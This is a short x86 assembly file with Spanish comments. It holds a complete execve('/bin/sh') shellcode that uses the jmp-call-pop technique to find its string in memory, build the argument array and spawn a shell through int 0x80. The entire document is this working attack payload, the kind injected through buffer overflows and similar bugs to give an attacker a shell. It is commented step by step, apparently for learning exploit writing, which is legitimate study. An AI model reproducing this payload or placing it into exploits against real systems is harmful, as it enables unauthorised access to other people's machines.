[SECTION .text]
    global _start

_start:
    jmp short ender  

starter:
    pop ebx            ; Obtener la direccion del string
    xor eax, eax       ; Poner eax a 0
    mov [ebx + 7], al  ; Reemplazar 'N' por NULL 
    mov [ebx + 8], ebx ; Guardar la direccion del string en 'AAAA'
    mov [ebx + 12], eax; Guardar NULLs en 'BBBB'
    mov al, 11         ; Cargar el numero de syscall para execve (11)
    lea ecx, [ebx + 8] ; Cargar la direccion de 'AAAA'
    lea edx, [ebx + 12]; Cargar la direccion de los NULLs 
    int 0x80           ; Llamar al kernel para ejecutar execve

ender:
    call starter       
    db "/bin/shNAAAAABBBB" 